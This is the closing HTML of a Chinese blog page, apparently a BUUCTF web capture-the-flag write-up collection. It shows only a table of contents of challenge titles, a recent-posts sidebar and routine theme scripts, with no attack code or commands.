class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-text">[HCTF_2018]WarmUp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="toc-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-text">[HCTF 2018]admin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flask%E7%9A%84session%E4%BC%AA%E9%80%A0"><span class="toc-text">flask的session伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95-unicode%E6%AC%BA%E9%AA%97"><span class="toc-text">另一种解法:unicode欺骗</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-text">[BJDCTF2020]Easy MD5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87md5"><span class="toc-text">数组绕过md5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0e%E7%BB%95%E8%BF%87md5"><span class="toc-text">0e绕过md5</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-text">[MRCTF2020]你传你🐎呢</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-htaccess%E6%96%87%E4%BB%B6"><span class="toc-text">利用.htaccess文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-text">[极客大挑战 2019]HardSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-text">基于报错的注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-text">[MRCTF2020]Ez_bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-text">[SUCTF 2019]CheckIn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-user-ini"><span class="toc-text">利用.user.ini</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-text">[网鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-text">[BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">[GWCTF 2019]我有一个数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-text">[BJDCTF2020]Mark loves cat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF2019-Fake-XML-cookbook"><span class="toc-text">[NCTF2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5%E5%BC%BA%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87-easy-web"><span class="toc-text">[md5强比较绕过]easy_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%88%86%E7%A0%B4-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-text">[脚本爆破]高明的黑客</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E8%84%9A%E6%9C%AC%E9%81%8D%E5%8E%86"><span class="toc-text">写脚本遍历</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cookie-SSTI-Cookie-is-so-stable"><span class="toc-text">[Cookie-SSTI]Cookie is so stable</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#intvalr%E7%BB%95%E8%BF%87-md5%E7%88%86%E7%A0%B4-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-text">[intvalr绕过,md5爆破]朴实无华</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E5%87%8F%E5%B0%91%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-easy-serialize-php"><span class="toc-text">[长度减少的反序列化字符串逃逸]easy_serialize_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unicode%E6%AC%BA%E9%AA%97-Unicorn-shop"><span class="toc-text">[unicode欺骗]Unicorn shop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE-Ezpop"><span class="toc-text">[反序列化pop链]Ezpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E8%AF%BB%E5%8F%96config-shrine"><span class="toc-text">[SSTI,绕过过滤读取config]shrine</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%88%B0%E6%96%87%E4%BB%B6-Nmap"><span class="toc-text">[nmap写一句话木马到文件]Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Love-Math"><span class="toc-text">[用数学函数构造命令执行]Love Math</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XFF-PYWebsite"><span class="toc-text">[XFF]PYWebsite</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-Web1"><span class="toc-text">[无列名注入]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-assert-eval-%E5%BC%95%E5%85%A5%E5%85%B6%E4%BB%96GET%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4-ReadlezPHP"><span class="toc-text">[反序列化,assert(eval(..)),引入其他GET参数绕过过滤]ReadlezPHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E7%9A%84%E7%9B%B2%E6%B3%A8-FinalSQL"><span class="toc-text">[基于异或运算的盲注]FinalSQL</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/bc5fabe9.html" title="JAVA学习路线">JAVA学习路线</a><time datetime="2023-07-31T03:26:12.000Z" title="发表于 2023-07-31 11:26:12">2023-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/1a09ef0b.html" title="汇编语言基础知识复习">汇编语言基础知识复习</a><time datetime="2022-10-29T15:33:28.000Z" title="发表于 2022-10-29 23:33:28">2022-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/a65f6ebf.html" title="buuctf_web部分刷题记录_PART4">buuctf_web部分刷题记录_PART4</a><time datetime="2022-10-29T01:04:46.000Z" title="发表于 2022-10-29 09:04:46">2022-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/383bfb1c.html" title="buuctf_web部分刷题记录_PART3">buuctf_web部分刷题记录_PART3</a><time datetime="2022-10-27T01:20:56.000Z" title="发表于 2022-10-27 09:20:56">2022-10-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/4f3ccb8a.html" title="buuctf_web部分刷题记录_PART2">buuctf_web部分刷题记录_PART2</a><time datetime="2022-10-22T13:19:16.000Z" title="发表于 2022-10-22 21:19:16">2022-10-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/1185562.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2014 - 2023 By 1ustinianus</div><div class="footer_custom_text">func YHZ(){const 💕XAQ bool = True},2022.08.09</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="6770516155" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="🤣,😘,🤨,🥱,😣,😤,😭" data-fontsize="25px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>